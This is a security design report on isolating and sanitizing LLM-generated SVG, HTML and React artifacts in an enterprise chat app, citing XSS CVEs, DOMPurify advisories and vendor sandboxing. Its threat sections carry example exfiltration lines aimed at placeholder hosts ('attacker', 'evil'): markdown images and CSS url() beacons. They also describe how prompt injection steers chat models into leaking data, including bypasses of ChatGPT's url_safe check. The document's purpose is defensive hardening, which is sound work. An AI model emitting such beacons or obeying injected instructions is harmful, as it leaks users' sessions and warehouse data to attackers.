# Security Model for Rendering LLM-Generated SVG / HTML / CSS / JS (incl. React) in an Enterprise Chat App (as of Nov 2026)

Context assumed: signed-in users, an app origin that holds session cookies and can reach warehouse data and API keys, and model output that can be steered by prompt injection from retrieved data. The design rule throughout: **treat every model-generated byte as attacker-controlled HTML.**

Research method note: about 16 searches and fetches. Primary sources fetched were the MCP Apps spec (ext-apps repo), MDN iframe reference, web.dev "Securely hosting user data", OpenAI Apps SDK security page, the mermaid config docs, the DOMPurify GitHub advisory list, Simon Willison's April 2026 post, and the local Next.js 16 CSP guide. CVE details for LibreChat, Open WebUI, mermaid and DOMPurify come partly from aggregators (SentinelOne, OSV, GitLab advisory DB, Tenable), so they are flagged where unconfirmed.

---

## 1. Threats: what can go wrong when model output is rendered

### Takeaway
The main risks are (a) XSS in the app origin, which in an enterprise data app means session, token and API-key theft plus warehouse queries made as the user, and (b) **zero-click exfiltration through anything that makes a network request**: markdown images, CSS `url()`, `fetch` inside an artifact, links, and form posts. Prompt injection in retrieved data can make the model emit any of these. Real 2025–2026 CVEs in Open WebUI, LibreChat and mermaid show that markdown and diagram renderers are the usual way in.

### Cited Findings
**XSS via markdown/HTML rendering (real incidents)**
- **Open WebUI CVE-2025-46719** (NVD published 2025-05-05). Stored XSS in versions before 0.6.6: `MarkdownTokens.svelte` passed HTML tokens straight to the DOM without sanitization. The attack payload is an `<iframe>` with an `onload` handler in a chat message, built to steal access tokens. Admins are the prized victims. OSV frames the impact as "account takeover and RCE via functions". Fixed in 0.6.6. Sources disagree on severity: Vulert gives CVSS 7.4, while CVE Logic rates it Medium. — [OSV](https://osv.dev/vulnerability/CVE-2025-46719); [SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-46719/); [Vulert](https://vulert.com/vuln-db/open-webui-vulnerable-to-stored-xss-via-unescaped-markdown-token-in-markdowntokens-svelte-leading-to-); [CVE Logic](https://www.cvelogic.com/cve/CVE-2025-46719)
- **LibreChat CVE-2026-54025** (GHSA-3phr-62qf-cxf3). Stored XSS in the **markdown artifact preview**. The `marked` library does not escape double quotes in image alt text, so a crafted alt can break out of the attribute and inject an event handler. Affects versions before 0.8.4-rc1. CWE-79, CVSS 3.1 Medium. This detail comes from aggregators and the GHSA itself was not fetched. — [OSV](https://osv.dev/vulnerability/CVE-2026-54025); [cvefeed](https://cvefeed.io/vuln/detail/CVE-2026-54025); [SOCRadar](https://socradar.io/free-tools/cve-radar/CVE-2026-54025)
- Other LibreChat XSS-class CVEs: CVE-2025-69221 (HTML/JS echoed in error responses, fixed 0.8.1), CVE-2025-8848 (HTML injection via the Accept-Language header in 0.7.9), and CVE-2025-66452 (XSS from missing JSON-parse error handling). — [SentinelOne CVE-2025-8848](https://www.sentinelone.com/vulnerability-database/cve-2025-8848/); [cve.imfht LibreChat list](https://cve.imfht.com/product/LibreChat)

**Mermaid XSS / CSS-injection history**
- CVE-2021-35513: XSS when the `antiscript` security level is used. — [GitLab advisory](https://advisories.gitlab.com/pkg/npm/mermaid/CVE-2021-35513)
- CVE-2022-31108 is a mermaid XSS. Details were not fetched. — [INCIBE](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2022-31108)
- CVE-2025-54880: XSS through architecture-diagram `iconText` (CWE-79). CVE-2025-54881: in mermaid 11.9.0's **default config**, user-supplied sequence-diagram labels are passed to `innerHTML` while element size is computed. — [GitLab CVE-2025-54880](https://advisories.gitlab.com/pkg/npm/mermaid/CVE-2025-54880/); [GitLab CVE-2025-54881](https://advisories.gitlab.com/pkg/npm/mermaid/CVE-2025-54881/)
- 2026 batch, all fixed in **mermaid 10.9.6 / 11.15.0**:
  - CVE-2026-41149: `classDef` in state diagrams allows DOM injection that escapes the SVG context. Mitigated by `securityLevel: "sandbox"`. Sources disagree on whether it is true XSS: one says script tags are stripped, while Tenable lists it as XSS/CWE-94.
  - CVE-2026-41148 (GHSA-xcj9-5m2h-648r): CSS-injection XSS. The fix adds a `sanitizeCss` filter on `classDef` style values.
  - CVE-2026-41159 (GHSA-87f9-hvmw-gh4p): CSS injection that escapes diagram scoping and restyles the whole page. Advice: avoid `securityLevel: 'loose'` and do not pass untrusted strings into `mermaid.initialize`.
  - Red Hat tracks CVE-2026-50159 as "attacker who can provide diagram text can inject arbitrary CSS into the rendered web page".
  — [releasealert CVE-2026-41149](https://releasealert.dev/cve/CVE-2026-41149); [SentinelOne CVE-2026-41148](https://www.sentinelone.com/vulnerability-database/cve-2026-41148/); [SentinelOne CVE-2026-41159](https://www.sentinelone.com/vulnerability-database/cve-2026-41159/); [Red Hat CVE-2026-50159](https://access.redhat.com/security/cve/cve-2026-50159); [Tenable GHSA-ghcm-xqfw-q4vr](https://www.tenable.com/plugins/cloud-security/441751)

**Prompt-injection-driven exfiltration**
- **Markdown image exfiltration**: injected instructions make the bot render `![](https://attacker/?q=<secret>)`, and the browser leaks the data when it fetches the image, with no click needed. — [Simon Willison, markdown-exfiltration tag](https://simonwillison.net/tags/markdown-exfiltration)
- OpenAI's mitigation was a client-side call to a validation API (`url_safe`) before rendering an image, not a CSP, and it was called "imperfect". Tenable (TRA-2025-06) showed `url_safe` returned true for bing.com links, so the check could be bypassed. Rehberger (embracethered.com) published a separate url_safe bypass used for "ChatGPT command and control via prompt injection". GitHub took a different route and disabled markdown image references to untrusted domains. — [BleepingComputer](https://www.bleepingcomputer.com/news/security/openai-rolls-out-imperfect-fix-for-chatgpt-data-leak-flaw/amp/); [Tenable TRA-2025-06](https://www.tenable.com/security/research/tra-2025-06); [Simon Willison](https://simonwillison.net/tags/markdown-exfiltration)
- OpenAI Apps SDK guidance: "Assume prompt injection and malicious inputs will reach your server". Validate model-supplied inputs on the server and require human confirmation for irreversible operations. — [OpenAI Apps SDK security & privacy](https://developers.openai.com/apps-sdk/guides/security-privacy)

**Social engineering / phishing UI**
- MCP Apps spec: "Hosts should clearly show the boundaries of sandboxed UI" (a social-engineering risk). Hosts should also implement resource limits against malicious Views that consume CPU or memory (DoS). — [MCP Apps spec 2026-01-26](https://github.com/modelcontextprotocol/ext-apps/blob/main/specification/2026-01-26/apps.mdx)
- OpenAI widgets cannot call `window.alert`, `window.prompt`, `window.confirm` or `navigator.clipboard`. This removes native-dialog phishing and clipboard abuse. — [OpenAI Apps SDK security](https://developers.openai.com/apps-sdk/guides/security-privacy)

### Inferences
- **Threat catalogue for the threat model** (from the sources above plus well-known browser behaviour; the SVG vectors are standard XSS knowledge and were not re-verified this session):
  1. *XSS in the app origin*: `<script>`, `on*=` handlers, `javascript:` URLs in `href`/`xlink:href`/`formaction`/SVG `<a>`, `<iframe srcdoc>`, `<object>`/`<embed>`, `<meta http-equiv=refresh>`, mXSS through parser differentials, and an unsafe `dangerouslySetInnerHTML` in React.
  2. *SVG-specific*: `<script>` in SVG; `<foreignObject>` (embeds arbitrary HTML); event handlers (`onload`, `onbegin` on SMIL `<animate>`/`<set>`); SMIL `<animate attributeName="href" to="javascript:...">` rewriting a link. The fresh DOMPurify advisory GHSA-c6gr-qvv4-5v3f is about exactly this guard; see section 2. Also: `<use href="https://evil/x.svg#a">` (external reference, which leaks a request), `<image href>` and `feImage` (network fetches), `<style>` with `@import`/`url()`, and SVG served as `image/svg+xml` from your own origin (it executes when opened directly).
  3. *Exfil without script*: markdown/HTML `<img>`, CSS `background:url(https://evil/?d=...)`, `@import`, `@font-face src`, CSS attribute-selector exfiltration, `<link rel=prefetch>`, `<form action>`, `<a ping>`, and auto-navigation with `<meta refresh>`.
  4. *Exfil with script inside a sandbox*: `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `navigator.sendBeacon`, `new Image().src`, `window.open`, `location =` navigation, WebRTC (`RTCPeerConnection`, an ICE/STUN DNS leak that `connect-src` historically did not fully cover), and DNS prefetch.
  5. *Clickjacking / phishing*: an artifact that draws a fake "Session expired, re-enter password" form, a fake approval button, or an overlay styled like the host chrome. Also links whose text and URL do not match.
  6. *Confused-deputy via the postMessage bridge*: an artifact that asks the host to "run this SQL" or "call this tool" with the user's privileges.
  7. *DoS*: billion-laughs-style huge SVG (deep nesting, millions of nodes, huge filter regions), `while(true){}` in JS, memory bombs, and runaway `requestAnimationFrame`. A cross-origin iframe may or may not run in its own process depending on the browser; see the web.dev caveat in section 3.
- In an enterprise data app, the bridge (item 6) and image/CSS exfil (item 3) are higher risk than in consumer chat. Retrieved warehouse rows are attacker-reachable input, and the data in context is exactly what an attacker wants.

## 2. Sanitization: DOMPurify / rehype-sanitize / Trusted Types, and when sanitizing is enough

### Takeaway
Sanitizing is enough only for **passive** content rendered in the app origin: markdown text, static SVG charts with no script, foreignObject or external refs, and mermaid in `strict`/`sandbox` mode. Anything that must run JS (HTML apps, React components) needs **isolation**. Even for passive content, DOMPurify keeps shipping bypass advisories (10 on the first advisory page alone between May and Oct 2026), so pair sanitizing with a strict app-origin CSP and pin the latest version.

### Cited Findings
- DOMPurify advisories published May–Oct 2026, from the first of three advisory pages:
  - GHSA-c6gr-qvv4-5v3f (Oct 12 2026, Low): the "SMIL attributeName=href guard is skipped when PARSER_MEDIA_TYPE is application/xhtml+xml".
  - GHSA-cg2g-xh64-v4q7 (Oct 12 2026, **Critical**): a SAFE_FOR_TEMPLATES bypass where split template expressions survive in attached shadow-root content on DOM output modes.
  - GHSA-mrv2-3pqr-j5jr (Oct 12 2026) and GHSA-p98j-92pf-mc4p (Sep 23 2026): with IN_PLACE, a node-removing hook leaves detached-subtree event handlers armed, causing DOM XSS.
  - GHSA-6688-9rhm-gjv2 (Sep 23 2026): IN_PLACE returns a force-removed rawtext root whose text still carries attacker markup.
  - GHSA-55q2-fjhq-7xh7 (Aug 3 2026): IN_PLACE hook removal leaves a detached subtree executable.
  - GHSA-c2j3-45gr-mqc4 (Jul 11 2026): CUSTOM_ELEMENT_HANDLING bypasses afterSanitizeElements.
  - GHSA-cmwh-pvxp-8882 (Jun 17 2026): permanent ALLOWED_ATTR pollution via setConfig(), an incomplete fix of the 3.4.7 patch.
  - GHSA-vxr8-fq34-vvx9 (Jun 10 2026): the Trusted Types policy survives clearConfig().
  - GHSA-gvmj-g25r-r7wr (May 29 2026): SAFE_FOR_TEMPLATES bypass inside `<template>`.
  — [DOMPurify security advisories](https://github.com/cure53/DOMPurify/security/advisories)
- CVE-2026-49459 (GHSA-r47g-fvhr-h676): a DOM-clobbering sanitizer bypass where `_forceRemove` skips elements with no parent, so a root element survives. Fixed in **DOMPurify 3.4.6**. The source page is fragmentary. — [SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2026-49459/)
- CVE-2025-26791 (GHSA-vhxf-7vqr-mrjg): mXSS through a wrong template-literal regex when SAFE_FOR_TEMPLATES is on. Affects versions before 3.2.4. — [Fluid Attacks](https://db.fluidattacks.com/adv/npm/dompurify/CVE-2025-26791)
- CVE-2024-47875 (GHSA-gx9m-whjm-85jf): nesting-based mXSS, CVSS 10, fixed in 2.5.0 / 3.1.3. — [CIRCL](https://vulnerability.circl.lu/vuln/CVE-2024-47875?page=6)
- Mermaid `securityLevel` values, quoted from the docs:
  - `strict` (default): "HTML tags in the text are encoded and click functionality is disabled".
  - `antiscript`: "HTML tags in text are allowed (only script elements are removed) and click functionality is enabled".
  - `loose`: "HTML tags in text are allowed and click functionality is enabled".
  - `sandbox`: "all rendering takes place in a sandboxed iframe. This prevents any JavaScript from running in the context", which "may hinder interactive functionality".
  The docs add: "It is the site owner's responsibility to discriminate between trustworthy and untrustworthy user-bases." — [mermaid usage docs](https://mermaid.js.org/config/usage.html)
- MCP Apps spec: "Hosts should review HTML for malicious patterns, generate hashes, warn users, and apply allow/blocklists". Static review is a complement, not a replacement for the sandbox. — [MCP Apps spec](https://github.com/modelcontextprotocol/ext-apps/blob/main/specification/2026-01-26/apps.mdx)

### Inferences
- **Decision rule**:
  - *Sanitize-only, in the app origin*: markdown → HTML (no raw HTML pass-through), static SVG charts, and mermaid output.
  - *Isolate*: anything with JS, React/JSX, `<style>` that could carry `url()`, `foreignObject`, or anything the user can interact with beyond hover.
  - When unsure, isolate. The cost of an iframe is low next to an XSS in an origin that holds warehouse credentials.
- **Recommended DOMPurify config for inline SVG** (option names from the DOMPurify API as I know it; the exact option list was not re-verified this session):
  ```js
  import DOMPurify from 'dompurify'; // pin >= latest 3.4.x patch; track advisories
  const clean = DOMPurify.sanitize(svgString, {
    USE_PROFILES: { svg: true, svgFilters: true },   // no html profile => no HTML in SVG
    FORBID_TAGS: ['foreignObject', 'script', 'style', 'use', 'image', 'feImage',
                  'animate', 'set', 'animateMotion', 'animateTransform', 'a'],
    FORBID_ATTR: ['style', 'href', 'xlink:href', 'src', 'action', 'formaction', 'ping'],
    ALLOW_DATA_ATTR: false,
    SAFE_FOR_TEMPLATES: false,   // several 2025-26 advisories live here; not needed for SVG
    RETURN_TRUSTED_TYPE: false,
    // Do NOT use IN_PLACE (5 of the 2026 advisories are IN_PLACE-specific)
  });
  DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
    // belt-and-braces: kill any url()/expression in presentation attrs (fill="url(#id)" is fine)
    if (/url\s*\(\s*['"]?\s*(?!#)/i.test(data.attrValue)) data.keepAttr = false;
  });
  ```
  Allow `fill="url(#gradId)"` (fragment references), but reject any external `url(http...)`. If `<use>` is needed for charts, allow it only when `href` starts with `#`, enforced in a hook. Also drop SMIL animation elements. The Oct 2026 GHSA-c6gr shows the href guard on SMIL `attributeName` can be skipped under the XHTML parser media type, so never set `PARSER_MEDIA_TYPE: 'application/xhtml+xml'`.
- **rehype-sanitize / hast-util-sanitize for markdown**: start from `defaultSchema`, which is GitHub-like. Keep `protocols.href` at `['http','https','mailto']` and route `img src` to a proxy or allowlist (see section 4). Do not add `style`, `iframe`, `svg` or `on*`. Use `clobberPrefix: 'user-content-'`, the default. Run `rehype-sanitize` *last* in the pipeline. Rendering raw HTML from the model with `rehype-raw` is acceptable only if `rehype-sanitize` comes after it. The LibreChat CVE-2026-54025 shows that a markdown library's own escaping (marked's alt text) cannot be trusted on its own.
- **Trusted Types**: on the app origin, set `Content-Security-Policy: require-trusted-types-for 'script'; trusted-types dompurify default nextjs#bundler` (policy names vary by stack; verify which names React/Next register). This makes any stray `innerHTML` sink in the chat renderer fail closed. Gap: I did not verify Next.js 16 Trusted Types compatibility.
- Mermaid: use `securityLevel: 'strict'` and `htmlLabels: false` where possible, never `loose` or `antiscript` for model-generated diagrams, and pin `>= 11.15.0`. Preferably run mermaid itself inside the artifact sandbox, or use `securityLevel: 'sandbox'`, so CSS-injection CVEs like CVE-2026-41159 cannot restyle the host page.

### Gaps
- I did not fetch the individual DOMPurify GHSA pages, so the affected and patched versions for the 2026 advisories are unknown. Pages 2–3 of the advisory list were not read.
- I did not read the hast-util-sanitize README this session. The schema field names above (`protocols`, `clobberPrefix`, `defaultSchema`) are from background knowledge.

## 3. Isolation: iframe sandbox, origins, CSP, COOP/COEP, Permissions-Policy, postMessage

### Takeaway
The gold standard is a **separate registrable domain**, ideally on the Public Suffix List with per-artifact subdomains. On it, a static **shim page** receives code over postMessage and renders it into a nested `sandbox="allow-scripts"` iframe (no `allow-same-origin`, which gives an opaque origin), with a strict header CSP of `connect-src 'none'`. A meta-tag CSP injected into `srcdoc` is a valid cheaper option that untrusted JS cannot strip.

### Cited Findings
- MDN sandbox tokens: `allow-scripts` "Allows the page to run scripts (but not create pop-up windows)". Without `allow-same-origin` "the resource is treated as being from a special origin that always fails the same-origin policy". `allow-popups-to-escape-sandbox` lets popups shed the sandbox flags, and without it popups and redirects inherit the restrictions. `allow-downloads` works "regardless of whether the user clicked". `allow-top-navigation-by-user-activation` allows top navigation only on a user gesture. `allow-modals` enables alert/confirm/print/prompt (`<dialog>` works regardless). — [MDN iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)
- MDN warning: "When the embedded document has the same origin as the embedding page, it is **strongly discouraged** to use both `allow-scripts` and `allow-same-origin`, as that lets the embedded document remove the `sandbox` attribute — making it no more secure than not using the `sandbox` attribute at all." — [MDN iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)
- MDN `credentialless`: content loads "in a new, ephemeral context. It doesn't have access to the network, cookies, and storage data associated with its origin". It lets COEP pages embed third-party docs. The `allow` attribute is a Permissions Policy that "implements a further restriction on top of the policy specified in the `Permissions-Policy` header". The `csp` attribute (CSP Embedded Enforcement) is also documented. — [MDN iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)
- Simon Willison (Apr 3 2026) tested in Chromium and Firefox. JS inside `sandbox="allow-scripts"` **cannot** escape or disable a `<meta http-equiv="Content-Security-Policy">` injected at the top of the iframe content: "CSP policies defined via meta tags are enforced at parse time", and the policy "persist[s] even when the iframe is navigated to a data: URI". This lets you get artifact-style CSP without a separate domain. — [Simon Willison](https://simonwillison.net/2026/Apr/3/test-csp-iframe-escape/)
- web.dev / Google, active content (HTML/SVG):
  - Use a dedicated sandbox domain on the **Public Suffix List** so each subdomain is cross-site from the others.
  - Route the shim URL to a static file. The host opens an iframe to a *random subdomain's* shim and postMessages the content. The shim turns it into a **Blob** and renders it in a sandboxed iframe. Because the main app fetches the data, no capability URLs are needed.
  - Classic shared sandbox domains like googleusercontent.com isolate user content from the main app but **not from other user content**, which is why Google is moving away from them.
  - Headers for inactive content: `X-Content-Type-Options: nosniff`, `Content-Disposition: attachment; filename="download"`, `Content-Security-Policy: sandbox`, `Content-Security-Policy: default-src 'none'`, `Cross-Origin-Resource-Policy: same-site`.
  - Defense in depth: `Content-Security-Policy: frame-ancestors 'none'`, `Cross-Origin-Opener-Policy: same-origin`, `Cross-Origin-Embedder-Policy: require-corp`.
  - Caveat: CSP sandbox alone is "likely sufficient" only if Spectre and renderer-compromise attacks are outside the threat model, because not all browsers isolate sandboxed documents into separate processes.
  — [web.dev Securely hosting user data](https://web.dev/articles/securely-hosting-user-data)
- MCP Apps (SEP-1865, stable 2026-01-26):
  - Web hosts MUST use a **sandbox proxy**, and "The Host and the Sandbox MUST have different origins". The proxy iframe has `allow-scripts allow-same-origin`. That is safe only *because* it is a different origin, and it loads the View with a CSP enforcing declared domains and blocking `object-src`.
  - Default CSP when `ui.csp` is omitted: `default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; media-src 'self' data:; connect-src 'none'`.
  - Mapping: `connectDomains` → `connect-src`; `resourceDomains` → script/style/img/font/media-src; `frameDomains` → `frame-src` (default `'none'`); `baseUriDomains` → `base-uri` (default `'self'`). Hosts "must not allow undeclared domains".
  - Permissions (`camera`, `microphone`, `geolocation`, `clipboardWrite`) map to the iframe `allow` attribute.
  - The host must not message the View before `ui/notifications/initialized`. The proxy forwards everything except `ui/notifications/sandbox-*`.
  - Hosts must reject `tools/call` for tools without `"app"` visibility, and should validate and log View-initiated RPCs.
  - `ui/notifications/size-changed` drives iframe resizing.
  - Weaknesses noted in the spec text: it does **not** mandate postMessage origin checks, its sample code uses `'*'` as targetOrigin, its Security-section example uses `connect-src 'self'` against the `'none'` default, and `ui/open-link` has no URL validation requirement.
  — [MCP Apps spec 2026-01-26](https://github.com/modelcontextprotocol/ext-apps/blob/main/specification/2026-01-26/apps.mdx); stable date and adopters per [morphllm](https://www.morphllm.com/mcp-apps)
- MCP Apps transport is JSON-RPC 2.0 over postMessage. — [sunpeak MCP App iframe sandbox](https://sunpeak.ai/blogs/mcp-app-iframe-sandbox-origins-cors)

### Inferences
- **Recommended architecture for ALOFT**, in three tiers:
  - **Tier A, minimum viable**: `<iframe sandbox="allow-scripts" srcdoc="...">` with a `<meta http-equiv="Content-Security-Policy">` as the *first* element of `<head>`. Opaque origin, no cookies, no app DOM. Good for SVG and HTML when budget is tight. Downsides: it shares the app's process and site (Spectre), `srcdoc` inherits some policy from the parent, and DevTools attribution is messier.
  - **Tier B, recommended**: a separate registrable domain, for example `aloft-usercontent.net`, not a subdomain of the app domain. A subdomain is same-*site*, so `SameSite=Lax` cookies scoped to the parent domain can still flow and cookie tossing is possible. Serve one static `shim.html` with header CSP, and the shim renders the artifact into a nested `sandbox="allow-scripts"` blob/srcdoc iframe.
  - **Tier C, defense in depth**: put that domain on the PSL and use a random subdomain per artifact or per conversation, so artifacts cannot read each other's storage if `allow-same-origin` is ever needed for the shim. Add COOP/COEP/CORP.
- **Outer iframe in the host page**:
  ```html
  <iframe
    src="https://<rand>.aloft-usercontent.net/shim.html#v=1"
    sandbox="allow-scripts allow-same-origin"   <!-- OK ONLY because cross-site; omit allow-same-origin if shim needs no storage -->
    allow="clipboard-write 'none'; camera 'none'; microphone 'none'; geolocation 'none'; payment 'none'; usb 'none'; fullscreen 'none'"
    referrerpolicy="no-referrer"
    loading="lazy"
    title="Generated visual (sandboxed)">
  </iframe>
  ```
  Do **not** grant `allow-popups-to-escape-sandbox`, `allow-top-navigation`, `allow-forms`, `allow-modals` or `allow-downloads`. If you want links to work, use `allow-popups` alone; popups then inherit the sandbox. A better option is to route links through a postMessage `open-link` request that the host validates and confirms.
- **Inner (artifact) iframe, created by the shim**: `sandbox="allow-scripts"` only, content via `srcdoc` or a `blob:` URL, plus a meta CSP.
- **Sandbox-origin response headers for `shim.html`**:
  ```
  Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'none'; frame-src blob: 'self'; child-src blob: 'self'; worker-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors https://app.aloft.example; upgrade-insecure-requests
  Cross-Origin-Opener-Policy: same-origin
  Cross-Origin-Resource-Policy: cross-origin   (shim must be frameable by the app)
  Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=(), clipboard-read=(), clipboard-write=(), display-capture=(), fullscreen=()
  Referrer-Policy: no-referrer
  X-Content-Type-Options: nosniff
  ```
  The meta CSP inside the artifact repeats the restrictive directives. `'unsafe-eval'` is needed only if JSX is transpiled in-browser (Babel standalone/sucrase). It is better to transpile React artifacts on the server or in a Web Worker and ship plain JS, or to pre-bundle the allowed libraries (React, Recharts, d3, Plotly) into the shim's own origin so `script-src 'self'` suffices. **`frame-ancestors` must name the app origin**, which also defeats clickjacking where a third party frames your shim.
- **App-origin headers on the chat route**: `frame-src https://*.aloft-usercontent.net` (nothing else) and `img-src 'self' data: https://img-proxy.aloft.example`.
- **postMessage protocol design**:
  - (1) The host keeps a ref to `iframe.contentWindow`. It accepts messages only when `event.source === iframeRef.contentWindow`. Because sandboxed opaque-origin frames report `event.origin === "null"`, check `source`, not origin, for the inner frame, and check `origin === "https://<rand>.aloft-usercontent.net"` for the shim.
  - (2) Send to the shim with an explicit targetOrigin, never `'*'`. This fixes the weakness in the MCP Apps sample code.
  - (3) Use a versioned JSON schema validated with zod, e.g. `{v:1, id, type: 'ready'|'resize'|'theme-ack'|'open-link'|'error'|'action-request', payload}`, and reject unknown types.
  - (4) A per-artifact random channel token is passed in the initial `render` message and echoed on every reply.
  - (5) `resize`: clamp to `[48, 4000]` px, rate-limit with rAF/debounce, and ignore resizes during user scroll. Inside the iframe, report height with a `ResizeObserver` on `document.documentElement`.
  - (6) `theme`: the host sends `{type:'theme', tokens:{...css vars}}` and the iframe applies them as CSS variables. No URLs are allowed in theme payloads, which closes the CSS `@import` hole the MCP spec leaves open for fonts.
  - (7) `open-link`: the host validates `https:` only, shows the real hostname in a confirm dialog, and opens with `window.open(url, '_blank', 'noopener,noreferrer')`.
  - (8) `action-request` (anything that touches data or tools) **always** needs explicit user confirmation in host chrome, outside the iframe. Never auto-execute it, and never pass API keys or warehouse credentials into the iframe. Pass only the data rows the artifact needs, already in the render message.
- **DoS controls**:
  - Cap artifact source size, e.g. 512 KB to 1 MB, and SVG node count before render.
  - Watchdog: if the iframe does not post `ready` or a heartbeat within N seconds, remove it.
  - For the strongest protection, give each artifact its own site (PSL domain) so Chromium site isolation puts runaway JS in a separate renderer process. Same-site `srcdoc` iframes share the chat's main thread, so `while(true)` freezes the chat.
  - Use `loading="lazy"` and unmount off-screen artifacts.
- **COEP**: putting `Cross-Origin-Embedder-Policy: require-corp` on the app would force the shim to send `CORP`, and allowed CDNs to send CORP/CORS. Only adopt COEP if you need SharedArrayBuffer. `credentialless` iframes are an option if COEP is on, but they are an ephemeral-context feature, not a substitute for the sandbox.

### Gaps
- I found no official Anthropic documentation of the claudeusercontent.com CSP. A third-party write-up says Claude artifacts are hosted on claudeusercontent.com with CSP delivered via HTTP header ([agentpatterns.ai](https://www.agentpatterns.ai/security/browser-sandbox-agent-generated-html/)). An unconfirmed Aug 2026 issue report mentions a `frame.claudeusercontent.com` sandboxed cross-origin iframe that blocks `fetch()` ([claudeissues](https://claudeissues.com/issue/87275-claude-code-cannot-read-claude-ai-artifact-links-sandboxed-frame-blocks-text-ext)). Exact directives and the CDN allowlist are unverified. Inspecting response headers in a browser would settle it.
- I did not verify the browser support status of the iframe `csp` attribute (CSP Embedded Enforcement), which has historically been Chromium-only, or of `credentialless`.
- Whether WebRTC is fully blocked by `connect-src 'none'` in current browsers was not verified this session. Treat it as a known historical leak and test it.

## 4. Restricting network: outbound blocking, image proxying, link safety

### Takeaway
Exfiltration needs a network request, so **deny by default**. Use `connect-src 'none'` plus `img-src`/`font-src`/`style-src` limited to `'self' data: blob:` in the sandbox. In the app origin, rewrite or allowlist every markdown image URL server-side before render. Do not rely on a "url_safe" style reputation check: it was bypassed twice.

### Cited Findings
- The MCP Apps default CSP denies all network (`connect-src 'none'`, `default-src 'none'`), and `connectDomains` must be declared explicitly. — [MCP Apps spec](https://github.com/modelcontextprotocol/ext-apps/blob/main/specification/2026-01-26/apps.mdx)
- OpenAI Apps SDK: "The CSP controls standard `fetch` requests". Nested frames are off by default and enabled only via `_meta.ui.csp.frameDomains`. "An embedded page uses its own CSP; the widget `connectDomains` and `resourceDomains` allowlists do not restrict network requests made inside that page". In other words, any allowed nested frame is a CSP escape hatch. — [OpenAI Apps SDK security](https://developers.openai.com/apps-sdk/guides/security-privacy)
- Developers reported that `_meta.ui.csp.connectDomains` and the legacy `openai/widgetCSP.connect_domains` appeared ignored in the published ChatGPT runtime. This is a community report and was later said to be resolved. — [OpenAI community](https://community.openai.com/t/view-csps-not-sourced-anymore-for-apps-published-in-store/1385052)
- ChatGPT's url_safe image check was bypassed: bing.com links returned true (Tenable TRA-2025-06), and Rehberger published a separate bypass. GitHub chose to disable images from untrusted domains instead. — [Tenable](https://www.tenable.com/security/research/tra-2025-06); [Simon Willison](https://simonwillison.net/tags/markdown-exfiltration)

### Inferences
- **Markdown images in the app origin**, ranked from strongest to weakest:
  - (a) Render no remote images from model output at all. Show a placeholder "image from example.com, click to load" that loads only on user action.
  - (b) Use an allowlist of first-party hosts, such as your own chart-render service and internal asset CDN.
  - (c) Route through an image proxy that **strips query strings and fragments**, or only serves images that were already present in retrieved content. Any proxy that faithfully forwards `?q=<secret>` still leaks, because the attacker's server sees the proxied request. Back these up with app CSP `img-src 'self' data: https://img-proxy.internal`.
  - Note that open redirectors on allowlisted domains (the bing.com issue) defeat simple allowlists. Allowlist exact hosts and paths, not reputable domains.
- **Links**: render model links with `rel="noopener noreferrer nofollow" target="_blank"` and `referrerpolicy="no-referrer"`. Show the real hostname next to the link or on hover. Require a confirmation interstitial for any URL whose host is not on an allowlist, and especially when the URL carries long query strings, since a user click is still an exfil channel. Strip `javascript:`, `data:` and `vbscript:` schemes (rehype-sanitize default `protocols`).
- **CSS exfil**: inside the sandbox, `img-src`/`font-src`/`style-src` without remote hosts blocks `url()` beacons. In the app origin, never allow model-supplied `style` attributes or `<style>` (see the mermaid CSS-injection CVEs).
- **Sandbox network allowlist**: allow at most a pinned CDN for libraries, e.g. `script-src https://cdnjs.cloudflare.com`. A CDN that serves arbitrary npm packages (jsdelivr, unpkg) lets an attacker publish a package and load it. That gives code execution but not exfil, as long as `connect-src`/`img-src` stay closed. Self-hosting the libraries in the shim origin is preferable.
- **Data flows only inward**: the host injects data into the artifact. The artifact never fetches warehouse APIs, and never receives tokens.

### Gaps
- I found no published spec for how Claude or ChatGPT proxy markdown images in late 2026. The current behaviour of ChatGPT's url_safe after the bypasses is unknown.

## 5. How production systems do it

### Takeaway
Every major vendor converges on **a cross-origin "usercontent" domain plus a sandboxed iframe plus a deny-by-default CSP with declared allowlists plus a postMessage bridge**: Anthropic `claudeusercontent.com`, OpenAI `web-sandbox.oaiusercontent.com`, Google `googleusercontent.com` moving to PSL-registered per-content sandboxes, and the MCP Apps sandbox proxy. Open-source chat UIs (Open WebUI, LibreChat) have repeatedly shipped XSS in their *markdown* paths, even where artifacts are iframed.

### Cited Findings
- **Claude artifacts**: a third-party write-up says they are hosted on claudeusercontent.com with CSP via HTTP header ([agentpatterns.ai](https://www.agentpatterns.ai/security/browser-sandbox-agent-generated-html/)). An unconfirmed report says they render in a sandboxed cross-origin iframe on `frame.claudeusercontent.com`, and `fetch()` of the frame URL is blocked ([claudeissues](https://claudeissues.com/issue/87275-claude-code-cannot-read-claude-ai-artifact-links-sandboxed-frame-blocks-text-ext)). Claude web and desktop support MCP Apps ([morphllm](https://www.morphllm.com/mcp-apps)).
- **ChatGPT Apps SDK widgets**:
  - They run "inside an isolated iframe with a strict Content Security Policy", with no alert/prompt/confirm/clipboard access ([OpenAI](https://developers.openai.com/apps-sdk/guides/security-privacy)).
  - The published widget iframe loads from `web-sandbox.oaiusercontent.com` ([OpenAI community](https://community.openai.com/t/trouble-with-csp-after-publishing-dev-app/1372222)).
